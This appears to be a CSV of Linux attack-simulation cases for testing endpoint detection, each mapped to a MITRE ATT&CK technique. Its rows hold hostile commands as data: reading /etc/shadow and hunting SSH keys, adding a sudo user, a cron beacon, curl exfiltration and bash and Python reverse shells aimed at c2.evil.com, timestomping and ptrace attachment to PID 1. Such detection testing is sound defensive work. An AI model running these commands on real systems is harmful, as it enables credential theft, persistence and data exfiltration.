id,name,description,platform,attack_type,mitre_technique_id,mitre_technique_name,complexity,simulation_steps,expected_detections,tags
LIN-CLI-001,PowerShell Command Execution,Execute commands via PowerShell on Linux to test cross-platform detection,linux,execution,T1059.001,PowerShell,low,"[{""order"":1,""role"":""cli"",""command"":""pwsh -Command 'Write-Host Hello from PowerShell; Get-Process | Select-Object -First 5'"",""description"":""Run PowerShell command to list processes"",""expected_artifact"":""pwsh process"",""timeout_seconds"":30}]","[""powershell_execution"",""suspicious_process""]","[""atomic-red-team"",""execution""]"
LIN-CLI-002,System Information Discovery,Enumerate system information using native Linux commands,linux,discovery,T1082,System Information Discovery,low,"[{""order"":1,""role"":""cli"",""command"":""uname -a"",""description"":""Get kernel and OS information"",""expected_artifact"":""uname process"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""cat /etc/os-release"",""description"":""Read OS release info"",""expected_artifact"":""/etc/os-release read"",""timeout_seconds"":10},{""order"":3,""role"":""cli"",""command"":""hostnamectl"",""description"":""Get hostname and system details"",""expected_artifact"":""hostnamectl process"",""timeout_seconds"":10}]","[""system_discovery"",""reconnaissance""]","[""discovery"",""native-tools""]"
LIN-CLI-003,Account Discovery,Enumerate local user accounts and groups,linux,discovery,T1087.001,Local Account Discovery,low,"[{""order"":1,""role"":""cli"",""command"":""cat /etc/passwd"",""description"":""Read local user accounts"",""expected_artifact"":""/etc/passwd read"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""cat /etc/group"",""description"":""Read local groups"",""expected_artifact"":""/etc/group read"",""timeout_seconds"":10},{""order"":3,""role"":""cli"",""command"":""lastlog 2>/dev/null || last -n 10"",""description"":""Check recent login history"",""expected_artifact"":""lastlog process"",""timeout_seconds"":10}]","[""account_discovery""]","[""discovery"",""atomic-red-team""]"
LIN-CLI-004,Create Local Account for Persistence,Create a new local user account for persistent access,linux,persistence,T1136.001,Create Local Account,medium,"[{""order"":1,""role"":""cli"",""command"":""useradd -m -s /bin/bash edr_test_user"",""description"":""Create new local user account"",""expected_artifact"":""edr_test_user in /etc/passwd"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""echo 'edr_test_user:TestPass123!' | chpasswd"",""description"":""Set password for new user"",""expected_artifact"":""password change event"",""timeout_seconds"":10},{""order"":3,""role"":""cli"",""command"":""usermod -aG sudo edr_test_user"",""description"":""Add user to sudo group"",""expected_artifact"":""group membership change"",""timeout_seconds"":10}]","[""account_creation"",""privilege_escalation""]","[""persistence"",""atomic-red-team""]"
LIN-CLI-005,Cron Job Persistence,Install a cron job for persistence,linux,persistence,T1053.003,Cron,medium,"[{""order"":1,""role"":""cli"",""command"":""echo '*/15 * * * * /tmp/.hidden_beacon.sh' | crontab -"",""description"":""Install persistent cron job"",""expected_artifact"":""crontab modification"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""echo '#!/bin/bash\ncurl -s http://c2.evil.com/beacon' > /tmp/.hidden_beacon.sh && chmod +x /tmp/.hidden_beacon.sh"",""description"":""Create beacon script"",""expected_artifact"":""/tmp/.hidden_beacon.sh"",""timeout_seconds"":10},{""order"":3,""role"":""cli"",""command"":""crontab -l"",""description"":""Verify cron installation"",""expected_artifact"":""crontab list output"",""timeout_seconds"":10}]","[""cron_persistence"",""scheduled_task""]","[""persistence"",""atomic-red-team""]"
LIN-CLI-006,Credential Dumping from Files,Access credential files and shadow database,linux,credential_access,T1003.008,/etc/passwd and /etc/shadow,medium,"[{""order"":1,""role"":""cli"",""command"":""cat /etc/shadow"",""description"":""Read shadow password file"",""expected_artifact"":""/etc/shadow read"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""find / -name '*.key' -o -name '*.pem' -o -name 'id_rsa' 2>/dev/null | head -20"",""description"":""Search for SSH keys and certificates"",""expected_artifact"":""file search for credentials"",""timeout_seconds"":30},{""order"":3,""role"":""cli"",""command"":""grep -r 'password' /etc/ 2>/dev/null | head -20"",""description"":""Search for passwords in config files"",""expected_artifact"":""grep for password strings"",""timeout_seconds"":30}]","[""credential_access"",""sensitive_file_read""]","[""credential-access"",""atomic-red-team""]"
LIN-CLI-007,Data Exfiltration via curl,Exfiltrate data to external server using curl,linux,exfiltration,T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,high,"[{""order"":1,""role"":""cli"",""command"":""tar czf /tmp/exfil.tar.gz /etc/passwd /etc/hostname 2>/dev/null"",""description"":""Stage data for exfiltration"",""expected_artifact"":""/tmp/exfil.tar.gz"",""timeout_seconds"":15},{""order"":2,""role"":""cli"",""command"":""curl -X POST -F 'file=@/tmp/exfil.tar.gz' http://c2.evil.com/api/data"",""description"":""Exfiltrate staged data via HTTP POST"",""expected_artifact"":""HTTP POST to c2.evil.com"",""timeout_seconds"":30},{""order"":3,""role"":""cli"",""command"":""rm -f /tmp/exfil.tar.gz"",""description"":""Clean up staged data"",""expected_artifact"":""file deletion"",""timeout_seconds"":10}]","[""data_exfiltration"",""suspicious_network""]","[""exfiltration"",""c2""]"
LIN-CLI-008,Reverse Shell Attempt,Attempt to establish a reverse shell connection,linux,command_and_control,T1059.004,Unix Shell,high,"[{""order"":1,""role"":""cli"",""command"":""bash -c 'bash -i >& /dev/tcp/c2.evil.com/4444 0>&1' &"",""description"":""Attempt bash reverse shell"",""expected_artifact"":""outbound TCP connection to c2.evil.com:4444"",""timeout_seconds"":15},{""order"":2,""role"":""cli"",""command"":""python3 -c 'import socket,subprocess,os;s=socket.socket();s.settimeout(5);s.connect((\"c2.evil.com\",4444));' 2>/dev/null || true"",""description"":""Attempt Python reverse shell"",""expected_artifact"":""python3 network connection"",""timeout_seconds"":15}]","[""reverse_shell"",""c2_communication""]","[""c2"",""high-severity""]"
LIN-CLI-009,Defense Evasion - Timestomp,Modify file timestamps to evade forensic analysis,linux,defense_evasion,T1070.006,Timestomp,medium,"[{""order"":1,""role"":""cli"",""command"":""echo 'malicious payload' > /tmp/evil.sh"",""description"":""Create a test file"",""expected_artifact"":""/tmp/evil.sh"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""touch -t 202001011200 /tmp/evil.sh"",""description"":""Modify timestamp to past date"",""expected_artifact"":""timestamp modification"",""timeout_seconds"":10},{""order"":3,""role"":""cli"",""command"":""stat /tmp/evil.sh"",""description"":""Verify modified timestamp"",""expected_artifact"":""stat output showing old date"",""timeout_seconds"":10}]","[""timestomp"",""defense_evasion""]","[""defense-evasion"",""atomic-red-team""]"
LIN-CLI-010,Process Injection via ptrace,Attempt process injection using ptrace system call,linux,privilege_escalation,T1055.008,Ptrace System Calls,high,"[{""order"":1,""role"":""cli"",""command"":""echo 0 > /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || true"",""description"":""Attempt to disable ptrace restrictions"",""expected_artifact"":""ptrace_scope modification"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""strace -p 1 -e trace=write -o /dev/null &"",""description"":""Attach strace to PID 1"",""expected_artifact"":""ptrace attach to init"",""timeout_seconds"":15},{""order"":3,""role"":""cli"",""command"":""gdb -batch -ex 'attach 1' -ex 'detach' -ex 'quit' 2>/dev/null || true"",""description"":""Attempt GDB attach to PID 1"",""expected_artifact"":""gdb ptrace attach"",""timeout_seconds"":15}]","[""process_injection"",""ptrace""]","[""privilege-escalation"",""high-severity""]"
